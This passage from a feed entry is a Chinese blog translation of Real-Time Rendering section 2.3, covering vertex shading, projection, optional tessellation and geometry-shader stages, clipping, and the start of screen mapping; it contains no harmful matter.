<p>公众号：墨风如雪小站</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[《实时渲染》第2章-图形渲染管线-2.3几何处理]]></title>    <link>https://juejin.cn/post/7597623654056443919</link>    <guid>https://juejin.cn/post/7597623654056443919</guid>    <pubDate>2026-01-21T12:42:16.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597623654056443919" data-draft-id="7597650624637140992" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="《实时渲染》第2章-图形渲染管线-2.3几何处理"/> <meta itemprop="keywords" content="计算机图形学"/> <meta itemprop="datePublished" content="2026-01-21T12:42:16.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="charlee44"/> <meta itemprop="url" content="https://juejin.cn/user/1117549770846872"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            《实时渲染》第2章-图形渲染管线-2.3几何处理
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1117549770846872/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    charlee44
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T12:42:16.000Z" title="Wed Jan 21 2026 12:42:16 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">实时渲染</h2>
<h3 data-id="heading-1">2. 图形渲染管线</h3>
<h4 data-id="heading-2">2.3 几何处理</h4>
<p>GPU上的几何处理阶段负责大多数每个三角形和每个顶点的操作。该阶段进一步分为以下功能阶段：顶点着色、投影、裁剪和屏幕映射（如图2.3）。</p>
<div align="center">
<p><img src="https://p0-xtjj-private.juejin.cn/tos-cn-i-73owjymdk6/7612d48e2f9c4783bf8e5ec63aaf758b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY2hhcmxlZTQ0:q75.awebp?policy=eyJ2bSI6MywidWlkIjoiMTExNzU0OTc3MDg0Njg3MiJ9&amp;rk3s=e9ecf3d6&amp;x-orig-authkey=f32326d3454f2ac7e96d3d06cdbb035152127018&amp;x-orig-expires=1769085679&amp;x-orig-sign=6Lcc%2Fc3L%2FGGdHSMzf85J0QGC%2Bts%3D" alt="" loading="lazy"/></p>
</div>
<div align="center">
<p>图2.3. 几何处理阶段分为一系列功能阶段</p>
</div>
<h5 data-id="heading-3">2.3.1 顶点着色</h5>
<p>顶点着色有两个主要任务，即计算顶点的位置和评估程序员可能喜欢的顶点输出数据，例如法线坐标和纹理坐标。传统上，对象的大部分阴影是通过将灯光应用到每个顶点的位置和法线并仅将结果颜色存储在顶点来计算的。然后将这些颜色插入整个三角形。出于这个原因，这个可编程的顶点处理单元被命名为顶点着色器[1049]。随着现代GPU的出现，以及每个像素发生的部分或全部着色，这个顶点着色阶段更加通用，并且可能根本不会求取任何着色方程的值，其工作主要取决于程序员的意图。顶点着色器现在是一个更通用的单元，专门用于设置与每个顶点关联的数据。例如，顶点着色器可以使用<a href="https://link.juejin.cn?target=%25E7%25AC%25AC4.4%25E8%258A%2582" target="_blank" title="%E7%AC%AC4.4%E8%8A%82" ref="nofollow noopener noreferrer">第4.4节</a>和<a href="https://link.juejin.cn?target=%25E7%25AC%25AC4.5%25E8%258A%2582" target="_blank" title="%E7%AC%AC4.5%E8%8A%82" ref="nofollow noopener noreferrer">第4.5节</a>中的方法为对象设置动画。</p>
<p>我们首先描述如何计算顶点位置，一组始终需要的坐标。在被屏幕显示的过程中，模型被转换成几个不同的空间或坐标系。最初，模型驻留在自己的模型空间中，这仅意味着它根本没有被转换。每个模型都可以与模型变换相关联，以便可以对其进行定位和定向。可以将多个模型转换与单个模型相关联。这允许同一模型的多个副本（称为实例）在同一场景中具有不同的位置、方向和大小，而无需复制基本几何体。</p>
<p>模型变换所变换的是模型的顶点和法线。对象的坐标称为模型坐标，在对这些坐标应用模型变换后，模型被称为位于世界坐标或世界空间中。世界空间是唯一的，模型经过各自的模型变换后，所有的模型都存在于同一个空间中。</p>
<p>如前所述，模型只有被相机（或观察者）看到才能渲染。相机在世界空间中有一个位置和一个方向，用于放置和瞄准相机。为了便于投影和剪辑，相机和所有模型都使用视图变换进行了变换。视图变换的目的是将相机放置在原点并瞄准它，使其看向负z轴的方向，y轴指向上方，x轴指向右侧。我们使用-z轴约定；一些文章也会使用向下看+z轴的约定。区别主要是语义上的，因为一个和另一个之间的转换很简单。应用视图变换后的实际位置和方向取决于底层应用程序编程接口 (API)。如此划定的空间称为相机空间，或更常见的是，视图空间或眼睛空间。视图变换影响相机和模型的方式示例如图2.4所示。模型变换和视图变换都可以用4×4矩阵来实现，这是<a href="https://link.juejin.cn?target=%25E7%25AC%25AC4%25E7%25AB%25A0" target="_blank" title="%E7%AC%AC4%E7%AB%A0" ref="nofollow noopener noreferrer">第4章</a>的主题。但是，重要的是要意识到可以以程序员喜欢的任何方式计算顶点的位置和法线。</p>
<div align="center">
<p><img src="https://p0-xtjj-private.juejin.cn/tos-cn-i-73owjymdk6/8d94ab1c1ab2456c9933558b2c01ef4a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY2hhcmxlZTQ0:q75.awebp?policy=eyJ2bSI6MywidWlkIjoiMTExNzU0OTc3MDg0Njg3MiJ9&amp;rk3s=e9ecf3d6&amp;x-orig-authkey=f32326d3454f2ac7e96d3d06cdbb035152127018&amp;x-orig-expires=1769085679&amp;x-orig-sign=DEAeJkKZm7YuJkhu8YJ%2FSHYt1Mc%3D" alt="" loading="lazy"/></p>
</div>
<div align="center">
<p>图2.4 在左图中，自上而下的视图显示了在+z轴向上的坐标系中，按照用户希望的方式定位和定向的相机。视图变换重新定向了坐标系，使相机位于原点，沿其负z轴看，相机的+y轴向上，如右图所示。这样做是为了使裁剪和投影操作更简单、更快捷。浅蓝色区域是视锥体。在这里，假设透视图，因为视锥体是一个平截头体。类似的技术适用于任何类型的投影。</p>
</div>
<p>接下来，我们将描述顶点着色的第二种类型的输出。要生成逼真的场景，仅渲染对象的形状和位置是不够的，还必须对它们的外观进行建模。该描述包括每个物体的材质，以及任何光源照射在物体上的效果。材料和灯光可以通过多种方式建模，从简单的颜色到物理描述的精细表示。</p>
<p>这种确定光对材料效果的操作称为着色。它涉及计算对象上不同点的着色方程。通常，其中一些计算在模型顶点的几何处理期间执行，而其他计算可能在逐像素处理期间执行。各种材质数据可以存储在每个顶点，例如点的位置、法线、颜色或求取着色方程值所需的任何其他数字信息。然后，顶点着色结果（可以是颜色、矢量、纹理坐标以及任何其他类型的着色数据）被发送到光栅化和像素处理阶段进行插值并用于计算表面的着色。</p>
<p>GPU顶点着色器形式的顶点着色在本书中进行了更深入的讨论，尤其是在<a href="https://link.juejin.cn?target=%25E7%25AC%25AC3%25E7%25AB%25A0" target="_blank" title="%E7%AC%AC3%E7%AB%A0" ref="nofollow noopener noreferrer">第3章</a>和<a href="https://link.juejin.cn?target=%25E7%25AC%25AC5%25E7%25AB%25A0" target="_blank" title="%E7%AC%AC5%E7%AB%A0" ref="nofollow noopener noreferrer">第5章</a>中。</p>
<p>作为顶点着色的一部分，渲染系统先进行投影，然后进行裁剪，将视图体换为单位立方体，其极值点位于<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mo>−</mo><mn>1</mn><mo separator="true">,</mo><mo>−</mo><mn>1</mn><mo separator="true">,</mo><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(-1,-1,-1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord">−</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">−</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">−</span><span class="mord">1</span><span class="mclose">)</span></span></span></span></span> 和<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mn>1</mn><mo separator="true">,</mo><mn>1</mn><mo separator="true">,</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(1,1,1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">1</span><span class="mclose">)</span></span></span></span></span>之间。可以使用不同的范围来定义相同的体积，例如，<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mn>0</mn><mo>≤</mo><mi>z</mi><mo>≤</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(0 ≤ z ≤ 1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"/><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord">1</span><span class="mclose">)</span></span></span></span></span>。单位立方体称为正规化视图体。投影是在GPU上由顶点着色器首先完成的。常用的投影方法有两种，即正射投影（也称平行投影）和透视投影，如图2.5。事实上，正射投影只是一种平行投影。也可以使用其他几种投影方式（特别是在建筑领域），例如斜投影和轴测投影。老式街机游戏Zaxxon就是以后者命名的。</p>
<div align="center">
<p><img src="https://p0-xtjj-private.juejin.cn/tos-cn-i-73owjymdk6/6a2460500079400594fa99a4db100add~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY2hhcmxlZTQ0:q75.awebp?policy=eyJ2bSI6MywidWlkIjoiMTExNzU0OTc3MDg0Njg3MiJ9&amp;rk3s=e9ecf3d6&amp;x-orig-authkey=f32326d3454f2ac7e96d3d06cdbb035152127018&amp;x-orig-expires=1769085679&amp;x-orig-sign=rWwAdKUBicG1VawdZv1nwJXjX4c%3D" alt="" loading="lazy"/></p>
</div>
<div align="center">
<p>图2.5. 左侧是正射投影或平行投影；右边是透视投影。</p>
</div>
<p>请注意，投影表示为矩阵（<a href="https://link.juejin.cn?target=%25E7%25AC%25AC4.7%25E8%258A%2582" target="_blank" title="%E7%AC%AC4.7%E8%8A%82" ref="nofollow noopener noreferrer">第4.7节</a>），因此它有时可能与几何变换的其余部分连接。</p>
<p>正交观察的视图体通常是一个矩形框，正交投影将这个视图体变换为单位立方体。正交投影的主要特点是平行线在变换后保持平行。这种转换是平移和缩放的组合。</p>
<p>透视投影有点复杂。在这种类型的投影中，物体离相机越远，投影后看起来越小。另外，平行线可能会聚在地平线上。因此，透视变换模仿了我们感知物体大小的方式。在几何上，称为截头锥体的视图体是一个具有矩形底面的截棱锥。截头锥体也转化为单位立方体。正交变换和透视变换都可以用4×4矩阵构造（<a href="https://link.juejin.cn?target=%25E7%25AC%25AC4%25E7%25AB%25A0" target="_blank" title="%E7%AC%AC4%E7%AB%A0" ref="nofollow noopener noreferrer">第4章</a>），并且在任一变换之后，模型都被称为在裁剪坐标中。这些实际上是齐次坐标，在<a href="https://link.juejin.cn?target=%25E7%25AC%25AC4%25E7%25AB%25A0" target="_blank" title="%E7%AC%AC4%E7%AB%A0" ref="nofollow noopener noreferrer">第4章</a>中讨论过，因此这发生在除以w之前。GPU的顶点着色器必须始终输出这种类型的坐标，以便下一个功能阶段（裁剪）正常工作。</p>
<p>尽管这些矩阵将一个几何体转换为另一个几何体，但它们被称为投影，因为在显示之后，z坐标不存储在生成的图像中，而是存储在z缓冲区中，如<a href="https://link.juejin.cn?target=%25E7%25AC%25AC2.5%25E8%258A%2582" target="_blank" title="%E7%AC%AC2.5%E8%8A%82" ref="nofollow noopener noreferrer">第2.5节</a>所述。通过这种方式，模型从三维投影到两维。</p>
<h5 data-id="heading-4">2.3.2 可选的顶点处理</h5>
<p>每个管线都有刚刚描述的顶点处理。完成此处理后，可以在GPU上进行几个可选阶段，按顺序是：曲面细分、几何着色和流输出。它们的使用取决于硬件的能力——并非所有 GPU 都有它们——以及程序员的愿望。它们相互独立，一般不常用。 将在<a href="https://link.juejin.cn?target=%25E7%25AC%25AC3%25E7%25AB%25A0" target="_blank" title="%E7%AC%AC3%E7%AB%A0" ref="nofollow noopener noreferrer">第3章</a>中详细介绍每一个。</p>
<p>第一个可选阶段是曲面细分。假设你有一个弹跳球对象。如果用一组三角形表示它，则可能会遇到质量或性能问题。您的球在5米外可能看起来不错，但近距离观察单个三角形，三角形的轮廓，就会变得清晰可见。如果你用更多的三角形制作球来提高质量，当球很远并且只覆盖屏幕上的几个像素时，你可能会浪费大量的处理时间和内存。通过曲面细分，可以使用适当数量的三角形生成曲面。</p>
<p>我们已经讨论了一些三角形，但在管线中的这一点上，我们只处理了顶点。这些可用于表示点、线、三角形或其他对象。顶点可用于描述曲面，例如球。这样的表面可以由一组面片指定，每个面片由一组顶点组成。曲面细分阶段由一系列阶段本身组成——外包着色器(hull shader)、曲面细分器(tessellator)和域着色器(domain shader)——将这些面片顶点集转换为（通常）更大的顶点集，然后用于制作新的三角形集。场景的相机可用于确定生成了多少个三角形：面片很近时很多，远处时很少。</p>
<p>下一个可选阶段是几何着色器。该着色器早于曲面细分着色器，因此在GPU上更常见。它类似于曲面细分着色器，因为它接受各种类型的图元并可以生成新的顶点。这是一个更简单的阶段，因为此创建的范围有限，输出图元的类型也更有限。几何着色器有多种用途，其中最流行的一种是粒子生成。想象一下模拟烟花爆炸。每个火球都可以用一个点来表示，一个顶点。几何着色器可以将每个点变成面向观察者并覆盖多个像素的正方形（由两个三角形组成），从而为我们提供更令人信服的图元进行着色。</p>
<p>最后一个可选阶段称为流输出。这个阶段让我们使用GPU作为几何引擎。与将我们处理过的顶点沿着管道的其余部分发送到屏幕上不同，此时我们可以选择将这些顶点输出到数组中以供进一步处理。这些数据可以由CPU或GPU本身在以后的过程中使用。此阶段通常用于粒子模拟，例如我们的烟花示例。</p>
<p>这三个阶段按此顺序执行——曲面细分、几何着色和流输出——每个阶段都是可选的。无论使用哪个（如果有）选项，如果我们继续沿着管道向下走，我们就会得到一组具有齐次坐标的顶点，这些顶点将被检查相机是否能看到它们。</p>
<h5 data-id="heading-5">2.3.3 裁剪</h5>
<p>只有全部或部分在视图体内部的图元需要传递到光栅化阶段（以及随后的像素处理阶段），然后在屏幕上绘制它们。完全位于视图体内部的图元将按原样传递到下一个阶段。完全在视图体积之外的基元不会被进一步传递，因为它们没有被渲染。部分位于视图体内部的图元需要裁剪。例如，一条直线，在视图体外部有一个顶点，在视图体积内部有一个顶点，此时应该根据视图体对其进行裁剪；以便外部的顶点被位于该线和视图体之间的交点处的新顶点替换。投影矩阵的使用意味着变换后的图元被裁剪到单位立方体上。在裁剪之前进行视图变换和投影的好处是可以使裁剪问题保持一致；图元总是针对单位立方体进行裁剪。</p>
<p>裁剪过程如图2.6所示。除了视图体积的六个剪裁平面之外，用户还可以定义额外的剪裁平面来明显地剪裁对象。第818页的图19.1中显示了显示这种可视化类型的图像，称为剖视(sectioning)。</p>
<div align="center">
<p><img src="https://p0-xtjj-private.juejin.cn/tos-cn-i-73owjymdk6/36303ce988584f24a3a6e56e725a1366~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY2hhcmxlZTQ0:q75.awebp?policy=eyJ2bSI6MywidWlkIjoiMTExNzU0OTc3MDg0Njg3MiJ9&amp;rk3s=e9ecf3d6&amp;x-orig-authkey=f32326d3454f2ac7e96d3d06cdbb035152127018&amp;x-orig-expires=1769085680&amp;x-orig-sign=F5bHMGs4QsbJNDcKDMQwCBidCEU%3D" alt="" loading="lazy"/></p>
</div>
<div align="center">
<p>图2.6. 只需要单位立方体内部的图元（对应视锥体内部的图元）继续处理。因此，单位立方体外面的图元被丢弃，而完全在里面的图元被保留。与单位立方体相交的图元被裁剪在单位立方体上，从而产生新的顶点并丢弃旧的顶点。</p>
</div>
<p>裁剪步骤使用投影产生的4值齐次坐标进行裁剪。值通常不会跨透视空间中的三角形进行线性插值。需要第四个坐标，以便在使用透视投影时正确插入和裁剪数据。最后，执行透视除法，将生成的三角形的位置放入三维标准化设备坐标中。如前所述，此视图体积范围从<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mo>−</mo><mn>1</mn><mo separator="true">,</mo><mo>−</mo><mn>1</mn><mo separator="true">,</mo><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(-1,-1,-1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord">−</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">−</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">−</span><span class="mord">1</span><span class="mclose">)</span></span></span></span></span>到<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mn>1</mn><mo separator="true">,</mo><mn>1</mn><mo separator="true">,</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(1,1,1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">1</span><span class="mclose">)</span></span></span></span></span>。几何阶段的最后一步是从这个空间转换到窗口坐标。</p>
<h5 data-id="heading-6">2.3.4 屏幕映射</h5>
<p>只有视图体内部的（裁剪的）图元被传递到屏幕映射阶段，进入这个阶段时坐标仍然是三维的。每个图元的x和y坐标被转换为屏幕坐标。屏幕坐标与z坐标一起也称为窗口坐标。假设场景应该被渲染到一个最小位置在<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><msub><mi>x</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>y</mi><mn>1</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(x_1,y_1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose">)</span></span></span></span></span>，最大位置在<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><msub><mi>x</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>y</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(x_2 ,y_2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose">)</span></span></span></span></span>处的窗口（其中<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mn>1</mn></msub><mo>&lt;</mo><msub><mi>x</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">x_1 &lt; x_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6891em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>和<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math 